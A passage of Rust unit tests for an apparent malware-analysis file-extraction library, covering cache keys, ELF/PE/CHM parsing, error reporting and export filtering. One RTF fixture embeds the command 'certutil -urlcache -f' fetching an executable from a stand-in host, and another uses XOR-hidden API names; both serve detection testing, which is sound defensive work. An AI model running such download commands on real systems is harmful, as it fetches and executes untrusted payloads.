        assert_eq!(source.kind, tree_sitter::QueryErrorKind::NodeType);
        assert_eq!(
            err.to_string(),
            format!("invalid tree-sitter query for python: {source}")
        );
        let cause = std::error::Error::source(&err).expect("source");
        assert!(cause.downcast_ref::<tree_sitter::QueryError>().is_some());
    }

    /// The content/extension transition is path-derived but is written into
    /// the extraction output, so it has to be part of the disk-cache key.
    /// Identical bytes named `x.woff2` and `x.wav` detect as the same type,
    /// and before this was folded in they shared a cache entry: whichever was
    /// scanned first decided the mismatch metric for both, so a masquerade was
    /// reported on the wrong file or missed on the right one depending only on
    /// directory order.
    #[test]
    fn cache_variant_separates_extension_transitions() {
        let as_font = extraction_cache_variant(
            &rizin::Settings::default(),
            FileType::Shell,
            true,
            Some(("script", "font")),
            None,
        );
        let as_unknown = extraction_cache_variant(
            &rizin::Settings::default(),
            FileType::Shell,
            true,
            Some(("script", "unknown")),
            None,
        );
        let consistent = extraction_cache_variant(
            &rizin::Settings::default(),
            FileType::Shell,
            false,
            None,
            None,
        );
        assert_ne!(as_font, as_unknown);
        assert_ne!(as_font, consistent);
        assert_ne!(as_unknown, consistent);
        // Same transition, same bytes, same detected type: still one entry, so
        // a tree full of `.woff2` files does not lose cache sharing.
        assert_eq!(
            as_font,
            extraction_cache_variant(
                &rizin::Settings::default(),
                FileType::Shell,
                true,
                Some(("script", "font")),
                None
            )
        );
    }

    /// A mismatch whose transition could not be named must not collapse onto
    /// the no-mismatch key.
    #[test]
    fn cache_variant_separates_unnamed_mismatch() {
        assert_ne!(
            extraction_cache_variant(
                &rizin::Settings::default(),
                FileType::Shell,
                true,
                None,
                None
            ),
            extraction_cache_variant(
                &rizin::Settings::default(),
                FileType::Shell,
                false,
                None,
                None
            )
        );
    }

    #[test]
    fn cache_variant_separates_basename_facts() {
        // Identical Rust bytes can be a build hook or an ordinary module.
        // Archive extraction and standalone scans must not inherit whichever
        // basename happened to populate the content cache first.
        let key = |name| {
            extraction_cache_variant(
                &rizin::Settings::default(),
                FileType::Rust,
                false,
                None,
                name,
            )
        };
        assert_ne!(key(Some("build.rs")), key(Some("lib.rs")));
        assert_ne!(key(Some("build.rs")), key(None));
        assert_ne!(key(Some("")), key(None));
        assert_eq!(key(Some("build.rs")), key(Some("build.rs")));
    }

    /// `stage_for` derives its source branch from the grammar table; it must
    /// still cover every language it listed by hand, JCL included.
    #[test]
    fn stage_for_tags_every_source_language() {
        for file_type in [
            FileType::JavaScript,
            FileType::TypeScript,
            FileType::Python,
            FileType::Go,
            FileType::Rust,
            FileType::Java,
            FileType::Shell,
            FileType::Php,
            FileType::Ruby,
            FileType::Lua,
            FileType::CSharp,
            FileType::C,
            FileType::Scala,
            FileType::ObjectiveC,
            FileType::Kotlin,
            FileType::Swift,
            FileType::PowerShell,
            FileType::Perl,
            FileType::Groovy,
            FileType::Zig,
            FileType::Elixir,
            FileType::Clojure,
            FileType::Batch,
            FileType::Jcl,
            FileType::Makefile,
        ] {
            assert_eq!(stage_for(file_type), Stage::SourceExtract, "{file_type:?}");
        }
        assert_eq!(stage_for(FileType::Vbs), Stage::FormatExtract);
        assert_eq!(stage_for(FileType::Pe), Stage::PeParse);
    }

    #[test]
    fn open_classifies_text() {
        let bytes = b"hello world\n";
        let parsed = open(bytes);
        assert_eq!(parsed.bytes(), bytes);
    }

    #[test]
    fn parse_count_is_one_after_any_view_access() {
        let bytes = b"{\"name\":\"test\"}";
        let parsed = open(bytes);
        assert_eq!(parsed.parse_count(), 0);
        let _ = parsed.values();
        assert_eq!(parsed.parse_count(), 1);
        let _ = parsed.text();
        let _ = parsed.literals();
        let _ = parsed.metrics();
        assert_eq!(parsed.parse_count(), 1, "subsequent views must not reparse");
    }

    #[test]
    fn chm_overlay_uses_archive_data_and_directory_extents() {
        let overlay = include_bytes!("../testdata/chm/overlay-persistence-sample.chm");
        let parsed = open(overlay);
        let metrics = parsed.metrics();
        assert_eq!(metrics.get("binary.has_overlay"), Some(1.0));
        assert_eq!(metrics.get("binary.overlay_size"), Some(1546.0));
        assert!(metrics.get("binary.overlay_entropy").is_some());

        // This CHM stores its directory after the compressed data stream.
        // Its full physical length is archive content, despite looking like
        // a suffix when only section-0 entries are considered.
        let directory_at_end = include_bytes!("../testdata/chm/directory-at-end.chm");
        let parsed = open(directory_at_end);
        assert_eq!(parsed.metrics().get("binary.has_overlay"), None);
    }

    #[test]
    fn extraction_cache_separates_path_dependent_file_types() {
        assert_ne!(
            extraction_cache_variant(&rizin::Settings::default(), FileType::Gz, false, None, None),
            extraction_cache_variant(
                &rizin::Settings::default(),
                FileType::Npm,
                false,
                None,
                None
            ),
        );
        assert_eq!(
            extraction_cache_variant(
                &rizin::Settings::default(),
                FileType::Npm,
                false,
                None,
                None
            ),
            extraction_cache_variant(
                &rizin::Settings::default(),
                FileType::Npm,
                false,
                None,
                None
            ),
        );
    }

    #[test]
    fn extracted_round_trips_through_cache_json() {
        // The cache stores the extraction snapshot as zstd-compressed
        // JSON, so a real, rich extraction (sections, symbols, the
        // stng-typed byte-scan `text` tier, metrics, identity) must
        // survive serialize -> deserialize -> serialize unchanged.
        // Caching is off under cfg(test), so `extracted()` returns a
        // freshly computed snapshot to round-trip.
        let bytes =
            std::fs::read("tests/fixtures/test.exe").expect("test.exe fixture should exist");
        let parsed = open(&bytes);
        let original = parsed.extracted();
        let json = serde_json::to_vec(original).expect("serialize Extracted");
        let restored: Extracted = serde_json::from_slice(&json).expect("deserialize Extracted");
        assert_eq!(
            serde_json::to_value(original).unwrap(),
            serde_json::to_value(&restored).unwrap(),
            "Extracted must round-trip losslessly through the cache JSON form"
        );
        // Confirm the fixture actually exercised the stng-typed text tier
        // (the field that newly gained Deserialize), not just empty views.
        assert!(
            !original.strings.text.is_empty(),
            "fixture should yield byte-scan strings"
        );
    }

    #[test]
    fn pe_instruction_xor_strings_keep_provenance_across_snapshot() {
        // Synthetic PE containing only a decoder and inert API-name strings.
        // Names recovered from content must not be promoted into PE imports.
        let bytes = include_bytes!("../tests/fixtures/pe-xor-decoder.exe");
        let extracted = OpenOptions::new().rizin(false).open(bytes).run_pipeline();
        let check = |e: &Extracted| {
            let network = e
                .strings
                .text
                .iter()
                .find(|s| s.value == "InternetReadFile")
                .expect("instruction-derived XOR string must reach filefacts text");
            assert_eq!(network.method, stng::StringMethod::XorDecode);
            assert_eq!(
                network.source_spans().collect::<Vec<_>>(),
                vec![(0x800, 16), (0x600, 21)]
            );
            assert!(e.strings.text.iter().any(|s| s.value == "ShellExecuteW"));
            assert!(!e.symbols.iter().any(|s| s.kind() == SymbolKind::Import));
        };
        check(&extracted);
        let snapshot = ExtractedSnapshot::from(extracted);
        let json = serde_json::to_vec(&snapshot).unwrap();
        let restored: ExtractedSnapshot = serde_json::from_slice(&json).unwrap();
        check(&Extracted::from(restored));
    }

    #[test]
    fn snapshot_keeps_strings_decoded_out_of_the_file() {
        // An RTF's `\objdata` hex decodes to a command that appears nowhere
        // in the file's bytes. Those rows are appended to the text tier and
        // must survive the cache round-trip with the rest.
        let mut blob = Vec::new();
        blob.extend_from_slice(&0x0105_u32.to_le_bytes());
        blob.extend_from_slice(&2u32.to_le_bytes());
        blob.extend_from_slice(&8u32.to_le_bytes());
        blob.extend_from_slice(b"Package\0");
        blob.extend_from_slice(&0u32.to_le_bytes());
        blob.extend_from_slice(&0u32.to_le_bytes());
        let payload = b"cmd /c certutil -urlcache -f http://example.test/a.exe";
        blob.extend_from_slice(&(payload.len() as u32).to_le_bytes());
        blob.extend_from_slice(payload);
        let hex: String = blob.iter().map(|b| format!("{b:02x}")).collect();
        let bytes =
            format!("{{\\rtf1\\ansi{{\\object\\objemb{{\\*\\objdata {hex}}}}}}}").into_bytes();

        let extracted = open(&bytes).run_pipeline();
        let has_command =
            |e: &Extracted| e.strings.text.iter().any(|s| s.value.contains("certutil"));
        assert!(has_command(&extracted), "decoded command should be present");

        let snapshot = ExtractedSnapshot::from(extracted);
        let json = serde_json::to_vec(&snapshot).expect("serialize snapshot");
        let restored: ExtractedSnapshot = serde_json::from_slice(&json).unwrap();
        let rehydrated = Extracted::from(restored);
        assert!(
            has_command(&rehydrated),
            "decoded command must survive the cache round-trip"
        );
    }

    #[test]
    fn snapshot_round_trips_text_rows_in_order() {
        // The disk cache stores the byte-scan rows itself, as one list in
        // extraction order, so a cached `open` returns exactly the rows (and
        // order) a fresh one does.
        let bytes =
            std::fs::read("tests/fixtures/test.exe").expect("test.exe fixture should exist");
        let extracted = open(&bytes).run_pipeline();
        let want: Vec<stng::ExtractedString> = extracted.strings.text.rows().to_vec();
        assert!(!want.is_empty(), "fixture should yield byte-scan strings");

        let snapshot = ExtractedSnapshot::from(extracted);
        let json = serde_json::to_vec(&snapshot).expect("serialize snapshot");
        let restored: ExtractedSnapshot = serde_json::from_slice(&json).expect("deserialize");
        let got = Extracted::from(restored);
        assert_eq!(
            got.strings.text.rows().to_vec(),
            want,
            "cached text rows must match the fresh extraction exactly"
        );
    }

    #[test]
    fn metrics_always_include_size_and_entropy() {
        let bytes = b"x".repeat(256);
        let parsed = open(&bytes);
        let m = parsed.metrics();
        assert_eq!(m.get("file.size"), Some(256.0));
        assert!(m.get("file.entropy").unwrap() < 0.01);
    }

    /// `ParsedFile::symbol_iter` walks every Import / Export /
    /// Function row in one pass. Used by trait matchers that don't
    /// care which sub-kind a name appears in.
    #[test]
    fn symbol_iter_walks_all_three_collections() {
        let bytes =
            std::fs::read("tests/fixtures/test.exe").expect("test.exe fixture should exist");
        let parsed = open(&bytes);
        // Realize the views before iterating — the lazy parse runs
        // on first `.values()` access.
        let _ = parsed.values();
        let symbols = parsed.symbols();
        let import_count = symbols.iter_kind(SymbolKind::Import).count();
        assert!(import_count > 0, "PE fixture should have imports");
        let total = parsed.symbol_iter().count();
        let expected = symbols.iter_kind(SymbolKind::Import).count()
            + symbols.iter_kind(SymbolKind::Export).count()
            + symbols.iter_kind(SymbolKind::Function).count();
        assert_eq!(
            total, expected,
            "symbol_iter must visit every Import/Export/Function row"
        );
    }

    /// A healthy PE fixture should produce zero parse errors and
    /// no `parse.error_count` metric — the typed Errors view stays
    /// empty.
    #[test]
    fn healthy_pe_emits_no_parse_errors() {
        let bytes =
            std::fs::read("tests/fixtures/test.exe").expect("test.exe fixture should exist");
        let parsed = open(&bytes);
        // Realize.
        let _ = parsed.values();
        assert!(parsed.errors().is_empty());
        assert!(parsed.metrics().get("parse.error_count").is_none());
    }

    /// Malformed ELF bytes (anything that starts \x7fELF but is
    /// otherwise truncated) trip goblin's parse. The error must
    /// land in the typed Errors view tagged `elf-parse` and the
    /// generic byte-level metrics (file.size, file.entropy)
    /// must still be present — partial data is the contract.
    #[test]
    fn malformed_elf_records_error_but_keeps_byte_metrics() {
        // ELF magic + half a header — enough to be classified as
        // ELF by fileid, not enough for goblin to parse.
        let mut bytes = Vec::from(b"\x7fELF" as &[u8]);
        bytes.extend_from_slice(&[2, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0]);
        let parsed = open(&bytes);
        let _ = parsed.values();

        // Byte-level metrics survive even though the format parse
        // failed — generic::extract ran before format dispatch.
        assert!(parsed.metrics().get("file.size").is_some());

        // Structured error recorded.
        let errors = parsed.errors();
        assert!(!errors.is_empty(), "expected a malformed-elf error entry");
        let entry = errors.iter().next().unwrap();
        assert_eq!(entry.kind, ErrorKind::Malformed);
        assert_eq!(entry.stage, Stage::ElfParse);

        // Aggregate count metric.
        assert!(parsed.metrics().get("parse.error_count").is_some());
        // Specific format metric.
        assert!(parsed.metrics().get("elf.parse_failed").is_some());
    }

    /// A file cut off before its trailing section header table still has an
    /// intact ELF header and program headers; those must be parsed rather
    /// than the whole binary reported as unparseable.
    #[test]
    fn truncated_elf_section_table_keeps_segment_view() {
        let full = include_bytes!("../tests/fixtures/test.elf");
        let shoff =
            usize::try_from(u64::from_le_bytes(full[0x28..0x30].try_into().unwrap())).unwrap();
        let parsed = open(&full[..shoff + 64]);
        let _ = parsed.values();
        assert!(parsed.metrics().get("elf.parse_failed").is_none());
        assert!(
            parsed
                .metrics()
                .get("elf.section_headers_truncated")
                .is_some()
        );
        assert!(parsed.metrics().get("elf.program_header_count").is_some());
    }

    #[test]
    fn guarded_tree_sitter_skip_records_source_error_and_metric() {
        // Python's scanner state is modeled, and indentation this deep would
        // overflow its serialization buffer, so tree-sitter is never invoked.
        // The skip should be visible to callers instead of silently looking
        // like a source file with no AST.
        let mut source = String::new();
        for depth in 0..600 {
            source.push_str(&" ".repeat(depth));
            source.push_str("if x:\n");
        }
        source.push_str(&" ".repeat(600));
        source.push_str("pass\n");
        let parsed = OpenOptions::new()
            .path(std::path::Path::new("deep.py"))
            .open(source.as_bytes());
        let metrics = parsed.metrics();

        assert_eq!(parsed.fileid().file_type(), FileType::Python);
        assert!(metrics.get("file.size").is_some());
        assert_eq!(metrics.get("source.ast_unavailable"), Some(1.0));
        assert_eq!(
            metrics.get("source.ast_unavailable.tree_sitter_guard"),
            Some(1.0)
        );
        assert!(metrics.get("ast.node_count").is_none());

        let errors = parsed.errors();
        assert_eq!(errors.len(), 1);
        let entry = errors.iter().next().unwrap();
        assert_eq!(entry.kind, ErrorKind::Fallback);
        assert_eq!(entry.stage, Stage::SourceParse);
        assert!(entry.message.contains("tree-sitter parse skipped"));
        assert_eq!(metrics.get("parse.error_count"), Some(1.0));
    }

    /// Bytes no other test (or earlier run) has cached.
    fn unique_script(tag: &str) -> Vec<u8> {
        let ns = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map_or(0, |d| d.as_nanos());
        format!("#!/bin/sh\necho {tag} {} {ns}\n", std::process::id()).into_bytes()
    }

    /// Each `ParsedFile` reads and writes the disk cache only as its own
    /// options say, whatever another file opened alongside asked for. (Unit
    /// tests get a private cache root; see `cache::root_location`.)
    #[test]
    fn cache_setting_belongs_to_each_parsed_file() {
        let bytes = unique_script("cache-setting");
        let cached = OpenOptions::new().cache(true).rizin(false);

        let first = cached.open(&bytes);
        let _ = first.metrics();
        assert_eq!(first.parse_count(), 1, "nothing cached yet");

        let uncached = OpenOptions::new().cache(false).rizin(false).open(&bytes);
        let _ = uncached.metrics();
        assert_eq!(uncached.parse_count(), 1, "cache off: must not read it");

        let second = cached.open(&bytes);
        let _ = second.metrics();
        assert_eq!(second.parse_count(), 0, "cache on: served the entry");
        assert_eq!(
            serde_json::to_value(second.values()).unwrap(),
            serde_json::to_value(first.values()).unwrap()
        );

        // Rizin settings are part of the key: with rizin installed, a
        // rizin-on open must not be served the rizin-off entry. Without it
        // the two extractions are identical and rightly share one.
        let rizin_on = OpenOptions::new().cache(true).open(&bytes);
        let _ = rizin_on.metrics();
        assert_eq!(rizin_on.parse_count(), u32::from(rizin::available()));
    }

    /// The cache key changes with every option that changes a persisted
    /// extraction — rizin on/off, native-arch slicing, the size cap — and
    /// not with the timeout, which only ever yields an unpersisted result.
    #[test]
    fn cache_key_tracks_every_output_affecting_option() {
        let variant = |options: &OpenOptions<'_>| {
            extraction_cache_variant(&options.rizin, FileType::Elf, false, None, None)
        };
        let base = OpenOptions::new();
        let slower = base.clone().rizin_timeout(Duration::from_secs(5));
        assert_eq!(variant(&base), variant(&slower));
        assert!(variant(&base).starts_with(&base.rizin_fingerprint()));

        let distinct: std::collections::HashSet<String> = [
            base.clone(),
            base.clone().rizin(false),
            base.clone().rizin_native_arch_only(true),
            base.clone().rizin_max_bytes(1 << 20),
        ]
        .iter()
        .map(variant)
        .collect();
        // Without rizin installed none of these changes the output, and
        // all four share the `rizin=none` key.
        let expected = if rizin::available() { 4 } else { 1 };
        assert_eq!(distinct.len(), expected, "{distinct:?}");
    }

    /// A raised cancellation flag abandons the source parse of the file it
    /// was given to, leaving the other views intact; an unraised one, or
    /// none, changes nothing.
    #[test]
    fn cancellation_flag_reaches_the_source_parse() {
        let source = "def f():\n    return 1\n".repeat(20_000);
        let path = Path::new("cancel.py");

        let raised = AtomicBool::new(true);
        let cancelled = OpenOptions::new()
            .path(path)
            .cancellation(&raised)
            .open(source.as_bytes());
        assert!(cancelled.source_ast().is_none());
        let metrics = cancelled.metrics();
        assert_eq!(
            metrics.get("source.ast_unavailable.parse_cancelled"),
            Some(1.0)
        );
        assert_eq!(metrics.get("file.size"), Some(source.len() as f64));

        let lowered = AtomicBool::new(false);
        let options = OpenOptions::new().path(path).cancellation(&lowered);
        assert!(options.open(source.as_bytes()).source_ast().is_some());
        // The flag belongs to the options that carried it, not the process.
        let plain = OpenOptions::new().path(path).open(source.as_bytes());
        assert!(plain.source_ast().is_some());
    }

    #[test]
    fn open_options_identify_by_path_forced_type_or_precomputed_fileid() {
        let bytes = b"{\"name\":\"x\",\"version\":\"1.0.0\"}";
        let path = Path::new("package.json");
        let by_path = OpenOptions::new().path(path).open(bytes);
        assert_eq!(by_path.fileid().file_type(), FileType::PackageJson);
        assert_ne!(open(bytes).fileid().file_type(), FileType::PackageJson);

        // A forced type still takes the path's basename.
        let forced = OpenOptions::new()
            .path(path)
            .file_type(FileType::Text)
            .open(bytes);
        assert_eq!(forced.fileid().file_type(), FileType::Text);
        assert_eq!(
            forced
                .values()
                .get("file.basename")
                .and_then(|v| v.as_str()),
            Some("package.json")
        );

        let fileid = FileId::from_path_and_bytes(path, bytes);
        let precomputed = OpenOptions::new()
            .file_type(FileType::Text)
            .fileid(fileid)
            .open(bytes);
        assert_eq!(precomputed.fileid().file_type(), FileType::PackageJson);
    }
}

#[cfg(test)]
mod api_export_tests {
    use super::is_api_export;

    /// Compiler and loader artifacts must not count as a public API.
    ///
    /// Any C++ binary built with exceptions exports Itanium-ABI RTTI, and every
    /// Mach-O executable exports its image header. A stub with no real exports
    /// reaches four on those alone, which is enough to satisfy an
    /// `exports.api_count >= 4` suppression and silence the obfuscation rules
    /// that would otherwise describe it.
    #[test]
    fn rtti_and_image_header_are_not_api_exports() {
        for artifact in [
            "__ZTISt9exception",
            "_ZTSSt11logic_error",
            "__ZTVN10__cxxabiv117__class_type_infoE",
            "__ZTTSt13basic_fstream",
            "_mh_execute_header",
            "mh_execute_header",
        ] {
            assert!(!is_api_export(artifact), "{artifact} should not count");
        }
    }

    #[test]
    fn ordinary_symbols_are_api_exports() {
        for real in ["_main", "curl_easy_init", "_SSL_connect", "ZLibDecompress"] {
            assert!(is_api_export(real), "{real} should count");
        }
    }
}
